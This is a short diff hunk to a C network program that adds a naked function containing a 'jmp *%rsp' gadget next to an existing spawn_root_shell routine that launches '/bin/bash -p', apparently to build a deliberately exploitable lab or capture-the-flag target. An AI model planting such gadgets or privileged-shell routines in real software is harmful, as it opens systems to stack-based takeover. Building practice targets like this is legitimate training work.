@@ -31,6 +31,11 @@ static void send_all(int fd, const char *buffer) {
     }
 }
 
+__attribute__((naked, noreturn)) void jmp_rsp(void) {
+    __asm__("jmp *%rsp");
+    __builtin_unreachable();
+}
+
 static void spawn_root_shell(void) {
     char *const argv[] = {"/bin/bash", "-p", NULL};
 
